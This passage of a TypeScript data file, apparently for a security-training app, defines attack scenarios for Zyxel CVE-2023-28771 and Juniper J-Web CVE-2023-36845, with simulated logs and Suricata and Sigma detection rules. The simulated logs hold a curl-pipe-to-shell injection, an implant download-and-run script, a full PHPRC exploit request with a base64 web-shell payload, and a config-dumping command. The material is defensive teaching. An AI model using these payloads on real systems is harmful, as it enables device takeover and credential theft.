      sizeOrCode: 'UDP 188 Bytes',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Rapid7 and TRAPA Security showed that any bytes after the 48-byte 3DES header inside the IKEv2 Notify Type 14 payload are sent in cleartext over UDP/500.',
      rawLog: `[SURICATA_IKEV2] 198.51.100.233:49102 -> 172.16.0.1:500 (UDP)
ExchangeType=34 (IKE_SA_INIT) NextPayload=41 (Notify) NotifyMessageType=14 (NO_PROPOSAL_CHOSEN)
NotificationData=[48-byte 3DES block] + "\";curl http://198.51.100.233/z.sh|sh;echo \""`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET EXPLOIT Zyxel Firewall Pre-Auth IKEv2 Packet Command Injection (CVE-2023-28771)',
        ruleCode: `alert udp any any -> $HOME_NET 500 (msg:"CISA KEV Zyxel CVE-2023-28771 IKEv2 Notify Command Injection"; content:"|29 00|"; content:"|00 00 00 0e|"; distance:2; within:6; content:";"; distance:48; sid:2045893; rev:1;)`,
        mitigation:
          'Apply Zyxel firmware patches for CVE-2023-28771 and restrict UDP port 500 / 4500 to known site-to-site VPN peer IP addresses where possible.',
      },
    },
    {
      id: 'zyx-28771-2',
      no: 2,
      stageIndex: 2,
      timestamp: '00:44:19.018',
      sourceNodeId: 'zyxel_usg_firewall',
      targetNodeId: 'ssod_system_injection',
      sourceLabel: 'ssod (PID 1612)',
      targetLabel: '/tmp/sdwan_vpndebug.log',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'ssod system() Exec',
      shortAction: 'SDWAN DEBUG LOG RCE',
      info: 'ssod passes unescaped Notify string to system("echo ... >> /tmp/sdwan_vpndebug.log") as root',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation:
        'Using system("echo ...") to append debug logs to /tmp/sdwan_vpndebug.log turns any unescaped semicolon or backtick inside the packet into root command execution.',
      rawLog: `[PROCESS_EXEC] ppid=1612 (ssod) pid=9410 uid=0
cmd: /bin/sh -c echo [IKE_DEBUG] "";curl http://198.51.100.233/z.sh|sh;echo "" >> /tmp/sdwan_vpndebug.log`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Zyxel IKE Daemon (ssod) Spawning Shell or Network Downloader',
        ruleCode: `title: Zyxel CVE-2023-28771 ssod Spawning Shell / Curl / Wget
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    ParentImage|endswith: '/ssod'
    CommandLine|contains:
      - 'sdwan_vpndebug.log'
      - 'curl'
      - 'wget'
  condition: selection
level: critical`,
        mitigation:
          'Inspect /tmp/sdwan_vpndebug.log on Zyxel appliances for unexpected command strings or truncation.',
      },
    },
    {
      id: 'zyx-28771-3',
      no: 3,
      stageIndex: 3,
      timestamp: '00:44:19.610',
      sourceNodeId: 'ssod_system_injection',
      targetNodeId: 'firewall_root_payload',
      sourceLabel: 'Zyxel Firewall (root)',
      targetLabel: '198.51.100.233 :80',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP GET Stage-2 ELF',
      shortAction: 'FIREWALL STAGE-2 FETCH',
      info: 'Compromised firewall executes curl http://198.51.100.233/z.sh | sh as root',
      sizeOrCode: 'Root Implant',
      severity: 'CRITICAL',
      mitreId: 'T1583.005',
      explanation:
        'The injected command forces the firewall itself to reach out over HTTP/TCP and execute a stage-2 shell script as root.',
      rawLog: `GET /z.sh HTTP/1.1
Host: 198.51.100.233
User-Agent: curl/7.68.0
[STAGE2_SCRIPT] cd /tmp; wget http://198.51.100.233/mips64_implant -O .k; chmod +x .k; ./.k`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET MALWARE Outbound Shell Script Download From Perimeter Firewall',
        ruleCode: `alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"SOC Zyxel Firewall Fetching External .sh Stage"; flow:established,to_server; http.uri; content:".sh"; endswith; http.user_agent; content:"curl/"; sid:2045899; rev:1;)`,
        mitigation:
          'Perform a factory reset and firmware reflash on any Zyxel firewall that exhibited outbound shell script downloads.',
      },
    },
  ],
};

export const JUNIPER_JUNOS_JWEB_CVE_2023_36845_CHAIN_SCENARIO: AttackScenario = {
  id: 'juniper-junos-jweb-cve-2023-36845-chain',
  code: 'CVE-2023-36845',
  name: 'watchTowr, VulnCheck & CISA — Juniper Junos OS J-Web: PHPRC "/dev/fd/0" Fileless Pre-Auth RCE',
  shortSubtitle: 'watchTowr Labs · VulnCheck · Juniper SIRT · CVE-2023-36845 PHPRC=/dev/fd/0 & auto_prepend_file RCE',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Analyzed by watchTowr Labs, VulnCheck, Juniper SIRT, and CISA KEV (August 2023), CVE-2023-36845 (originally chained with CVE-2023-36844/36846/36847, CVSS 9.8) is a pre-authentication Remote Code Execution vulnerability in the J-Web management interface of Juniper Networks Junos OS on SRX firewalls and EX switches. Because the Appweb web server allowed unauthenticated query parameters on /webauth_operation.php to set process environment variables, an attacker simply sends POST /webauth_operation.php?PHPRC=/dev/fd/0 with an HTTP request body containing auto_prepend_file="data://text/plain;base64,...". When the FreeBSD php-cgi process starts, it reads its php.ini configuration directly from standard input (/dev/fd/0 — the HTTP POST body!) and executes the base64-encoded PHP payload completely filelessly in memory.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'watchTowr Labs Research · VulnCheck Fileless RCE Analysis · Juniper SIRT JSA72300 · CISA KEV',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (J-Web Pre-Auth RCE) · T1574.007 (PHPRC Env Variable Hijack) · T1059.004 (FreeBSD Shell)',
    },
    {
      term: 'FILELESS TRICK',
      value: 'POST /webauth_operation.php?PHPRC=/dev/fd/0 + body: auto_prepend_file="data://text/plain;base64,..."',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: '/var/log/httpd.log (PHPRC=/dev/fd/0) & php-cgi spawning /bin/sh on FreeBSD Junos',
    },
  ],
  nodes: [
    {
      id: 'juniper_phprc_attacker',
      label: 'Remote Exploit Operator',
      sublabel: '198.51.100.192 (Single HTTP POST Sender)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary HTTP Client',
        pidOrPort: 'HTTPS :443 -> /webauth_operation.php?PHPRC=/dev/fd/0',
        privilege: 'Unauthenticated External',
        artifacts: [
          'POST /webauth_operation.php?PHPRC=/dev/fd/0',
          'Body: auto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVtK..."',
        ],
        description:
          'Attacker sending a single unauthenticated HTTP POST request that sets PHPRC=/dev/fd/0 and supplies custom php.ini directives in the POST body.',
      },
    },
    {
      id: 'juniper_srx_jweb',
      label: 'Juniper SRX / EX (J-Web)',
      sublabel: '172.16.2.1 (Appweb + php-cgi)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Juniper Junos OS (FreeBSD-based SRX Firewall / EX Switch)',
        pidOrPort: 'PID 2210 (/usr/sbin/httpd-gk / Appweb)',
        privilege: 'www / nobody -> Junos CLI & root escalation',
        artifacts: [
          '/www/webauth_operation.php',
          '/var/log/httpd.log',
        ],
        description:
          'Juniper SRX firewall with J-Web enabled, where Appweb spawns a fresh /usr/local/bin/php-cgi process for each PHP request and populates environment variables from query args.',
      },
    },
    {
      id: 'php_cgi_fd0_engine',
      label: 'php-cgi PHPRC=/dev/fd/0 Loader',
      sublabel: 'Reads HTTP POST Body as php.ini',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'FreeBSD PHP-CGI Runtime (/usr/local/bin/php-cgi)',
        pidOrPort: 'PID 8842 (php-cgi reading /dev/fd/0)',
        privilege: 'J-Web Runtime Context',
        artifacts: [
          'Environment Variable: PHPRC=/dev/fd/0',
          'INI Directive: allow_url_include=1 & auto_prepend_file="data://..."',
        ],
        description:
          'When php-cgi initializes, it checks the PHPRC environment variable to locate php.ini. Pointing PHPRC to /dev/fd/0 (stdin) tricks php-cgi into parsing the HTTP POST body as php.ini!',
      },
    },
    {
      id: 'junos_config_shell',
      label: 'In-Memory PHP & Junos CLI Exec',
      sublabel: 'data:// Stream -> system() / cli',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Fileless PHP Execution & Junos Configuration Extraction',
        pidOrPort: 'PID 8845 (/bin/sh -c /usr/sbin/cli ...)',
        privilege: 'Junos Device Control & Credential Theft',
        artifacts: [
          'Zero files written to /var/tmp/ or /cf/var/',
          'Extracted /config/juniper.conf.gz ($9$ & SHA-512 password hashes)',
        ],
        description:
          'Because auto_prepend_file uses a data:// URI stream, the attacker’s PHP code executes before webauth_operation.php without touching the disk.',
      },
    },
    {
      id: 'junos_siem_monitor',
      label: 'Junos Syslog & NDR SIEM',
      sublabel: '/var/log/httpd.log & Suricata',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Network Intrusion Detection',
        pidOrPort: '/var/log/httpd.log + Suricata HTTP Rule',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'URI containing "PHPRC=" or "/webauth_operation.php"',
          'POST body containing "auto_prepend_file" or "allow_url_include"',
        ],
        description:
          'Detects HTTP requests setting PHPRC in the query string or body and unexpected child processes of php-cgi on Junos OS.',
      },
    },
  ],
  processTree: [
    {
      pid: 2210,
      ppid: 1,
      name: 'httpd (Appweb J-Web Server)',
      commandLine: '/usr/sbin/httpd --config /var/conf/httpd.conf',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['setenv("PHPRC", "/dev/fd/0")', 'fork()', 'execve("/usr/local/bin/php-cgi")'],
    },
    {
      pid: 8842,
      ppid: 2210,
      name: 'php-cgi (PHPRC=/dev/fd/0)',
      commandLine: '/usr/local/bin/php-cgi /www/webauth_operation.php',
      user: 'www',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'getenv("PHPRC") -> "/dev/fd/0"',
        'open("/dev/fd/0", O_RDONLY)',
        'zend_parse_ini_file(auto_prepend_file="data://text/plain;base64,...")',
      ],
      memoryBlocks: [
        {
          address: '0x0000000801A00000',
          section: 'php-cgi In-Memory INI + data:// Stream',
          permissions: 'RW-',
          size: '16 KB',
          status: 'injected',
          description:
            'php-cgi parsing standard input (/dev/fd/0) as php.ini and prepending a base64 data:// PHP payload before webauth_operation.php.',
          hexPreview: 'allow_url_include=1\\nauto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVt..."',
        },
      ],
    },
    {
      pid: 8845,
      ppid: 8842,
      name: 'sh (Fileless RCE Child)',
      commandLine: '/bin/sh -c id; cat /config/juniper.conf.gz | base64',
      user: 'www',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['popen("id; cat /config/juniper.conf.gz")', 'write(stdout)'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'MANIPULATING THE "PHPRC" ENVIRONMENT VARIABLE VIA J-WEB (CVE-2023-36845)',
      subtitle: 'Passing ?PHPRC=/dev/fd/0 to /webauth_operation.php without authentication',
      description:
        'First analyzed as a 2-bug chain by watchTowr Labs (uploading a temp file via CVE-2023-36846 and pointing PHPRC to it via CVE-2023-36845) and refined into a 1-request fileless exploit by VulnCheck, Juniper’s Appweb server allowed unauthenticated requests to /webauth_operation.php to populate environment variables in the spawned php-cgi process. By requesting POST /webauth_operation.php?PHPRC=/dev/fd/0, the attacker sets the PHP runtime’s configuration file path (PHPRC) to file descriptor 0 (standard input—which in CGI mode holds the raw HTTP POST request body!).',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['juniper_phprc_attacker', 'juniper_srx_jweb', 'junos_siem_monitor'],
      compromisedNodeIds: ['juniper_srx_jweb'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-36845 (J-Web PHP Environment Variable Manipulation)' },
        { term: 'TARGET ENDPOINT', value: 'POST /webauth_operation.php?PHPRC=/dev/fd/0' },
        { term: 'FREEBSD STDIN FD', value: '/dev/fd/0 (Maps directly to the HTTP POST body in CGI)' },
      ],
    },
    {
      index: 2,
      title: 'INJECTING AUTO_PREPEND_FILE="DATA://..." IN THE HTTP POST BODY',
      subtitle: 'Tricking php-cgi into parsing the POST body as php.ini and enabling allow_url_include',
      description:
        'When /usr/local/bin/php-cgi starts up to handle the request, it checks the PHPRC environment variable, opens /dev/fd/0, and parses the attacker’s HTTP POST body as its official php.ini configuration file! Inside the POST body, the attacker supplies two php.ini directives: allow_url_include=1 and auto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVtK..."—telling PHP to automatically decode and execute the inline base64 PHP code before running a single line of webauth_operation.php.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1574.007',
      mitreTechniqueName: 'Hijack Execution Flow: Path Interception by Environment Variable',
      activeNodeIds: ['juniper_srx_jweb', 'php_cgi_fd0_engine', 'junos_siem_monitor'],
      compromisedNodeIds: ['juniper_srx_jweb', 'php_cgi_fd0_engine'],
      keySpecs: [
        { term: 'INI DIRECTIVE 1', value: 'allow_url_include = 1 (Enables data:// stream execution)' },
        { term: 'INI DIRECTIVE 2', value: 'auto_prepend_file = "data://text/plain;base64,..."' },
        { term: 'DISK FOOTPRINT', value: 'Zero files written to disk (100% fileless in memory)' },
      ],
    },
    {
      index: 3,
      title: 'FILELESS IN-MEMORY PHP EXECUTION & JUNOS CONFIG EXTRACTION',
      subtitle: 'Running system() inside php-cgi to dump /config/juniper.conf.gz and pivot',
      description:
        'As php-cgi processes the data:// stream from auto_prepend_file, the attacker’s PHP code calls system() or passthru() to run arbitrary shell commands on the FreeBSD-based Junos OS—extracting the active firewall configuration (/config/juniper.conf.gz), cracking $9$ / SHA-512 administrator hashes, or planting persistent backdoors.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['juniper_phprc_attacker', 'php_cgi_fd0_engine', 'junos_config_shell', 'junos_siem_monitor'],
      compromisedNodeIds: ['juniper_srx_jweb', 'php_cgi_fd0_engine', 'junos_config_shell'],
      keySpecs: [
        { term: 'EXECUTION CONTEXT', value: 'php-cgi -> /bin/sh on FreeBSD Junos OS' },
        { term: 'TARGET CONFIG', value: '/config/juniper.conf.gz (Firewall rules, VPN keys & hashes)' },
        { term: 'MITIGATION', value: 'Patch Junos OS (JSA72300) or disable J-Web on WAN interfaces' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'jun-36845-1',
      no: 1,
      stageIndex: 1,
      timestamp: '19:05:11.304',
      sourceNodeId: 'juniper_phprc_attacker',
      targetNodeId: 'juniper_srx_jweb',
      sourceLabel: '198.51.100.192',
      targetLabel: 'Juniper SRX :443 (J-Web)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / CVE-2023-36845',
      shortAction: 'PHPRC=/DEV/FD/0 POST',
      info: 'POST /webauth_operation.php?PHPRC=/dev/fd/0 with auto_prepend_file data:// stream in body',
      sizeOrCode: 'HTTP 200 OK',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'VulnCheck and watchTowr demonstrated that setting PHPRC=/dev/fd/0 on /webauth_operation.php achieves single-packet fileless RCE without needing CVE-2023-36846 file uploads.',
      rawLog: `POST /webauth_operation.php?PHPRC=/dev/fd/0 HTTP/1.1
Host: 172.16.2.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

allow_url_include=1
auto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZGllKCk7Pz4="`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET EXPLOIT Juniper Junos J-Web CVE-2023-36845 PHPRC Environment Variable Injection',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISA KEV Juniper J-Web CVE-2023-36845 PHPRC RCE Attempt"; flow:established,to_server; content:"PHPRC="; nocase; content:"auto_prepend_file"; nocase; sid:2047892; rev:1;)`,
        mitigation:
          'Upgrade Junos OS per Juniper Security Advisory JSA72300 and disable J-Web HTTP/HTTPS management on untrusted external interfaces.',
      },
    },
    {
      id: 'jun-36845-2',
      no: 2,
      stageIndex: 2,
      timestamp: '19:05:11.348',
      sourceNodeId: 'juniper_srx_jweb',
      targetNodeId: 'php_cgi_fd0_engine',
      sourceLabel: 'httpd (Appweb)',
      targetLabel: 'php-cgi (PID 8842)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'J-Web httpd.log',
      shortAction: 'STDIN PHP.INI PARSE',
      info: 'php-cgi opens /dev/fd/0 as php.ini and executes base64 data:// stream via auto_prepend_file',
      sizeOrCode: 'Fileless INI',
      severity: 'CRITICAL',
      mitreId: 'T1574.007',
      explanation:
        'In CGI environments, file descriptor 0 (/dev/fd/0) contains the HTTP POST body, allowing php-cgi to parse attacker-controlled php.ini directives directly from memory.',
      rawLog: `[/var/log/httpd.log] 198.51.100.192 - - [25/Aug/2023:19:05:11 +0000] "POST /webauth_operation.php?PHPRC=/dev/fd/0 HTTP/1.1" 200 1842
[PHP_CGI_ENV] PHPRC="/dev/fd/0" SCRIPT_FILENAME="/www/webauth_operation.php"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Juniper J-Web Access Log Showing PHPRC Manipulation (CVE-2023-36845)',
        ruleCode: `title: Juniper J-Web CVE-2023-36845 PHPRC Exploitation
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains: 'PHPRC='
  condition: selection
level: critical`,
        mitigation:
          'Inspect /var/log/httpd.log on all Juniper SRX and EX devices for requests to /webauth_operation.php or PHPRC parameters.',
      },
    },
    {
      id: 'jun-36845-3',
      no: 3,
      stageIndex: 3,
      timestamp: '19:05:11.612',
      sourceNodeId: 'php_cgi_fd0_engine',
      targetNodeId: 'junos_config_shell',
      sourceLabel: 'php-cgi (PID 8842)',
      targetLabel: '/bin/sh -> /config/juniper.conf.gz',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'FreeBSD Process Exec',
      shortAction: 'JUNOS CONFIG EXFIL',
      info: 'php-cgi spawns /bin/sh to read /config/juniper.conf.gz and return output in the HTTP response',
      sizeOrCode: '1,842 Bytes',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation:
        'The prepended PHP script executes system() and calls die() before webauth_operation.php runs, streaming the stolen Junos configuration back in the HTTP 200 response.',
      rawLog: `[PROCESS_EXEC] ppid=8842 (php-cgi) pid=8845 uid=80 (www)
cmd="/bin/sh -c id; cat /config/juniper.conf.gz | base64"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'PHP-CGI Spawning Unexpected Shell Process on Network Appliance',
        ruleCode: `title: PHP-CGI Spawning Shell (CVE-2023-36845 Post-Exploitation)
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    ParentImage|endswith: '/php-cgi'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/cli'
  condition: selection
level: critical`,
        mitigation:
          'Rotate all local Junos accounts, BGP/OSPF authentication keys, and IPsec pre-shared keys stored in juniper.conf.',
      },
    },
  ],
};

export const APT_BATCH3_VIRTUALIZATION_APPLIANCES_SCENARIOS: AttackScenario[] = [
  VMWARE_VCENTER_CVE_2023_34048_UNC3886_SCENARIO,
  BARRACUDA_ESG_CVE_2023_2868_UNC4841_SCENARIO,
  CISCO_IOS_XE_CVE_2023_20198_BADCANDY_SCENARIO,
  ZYXEL_FIREWALL_CVE_2023_28771_IKE_RCE_SCENARIO,
  JUNIPER_JUNOS_JWEB_CVE_2023_36845_CHAIN_SCENARIO,
];
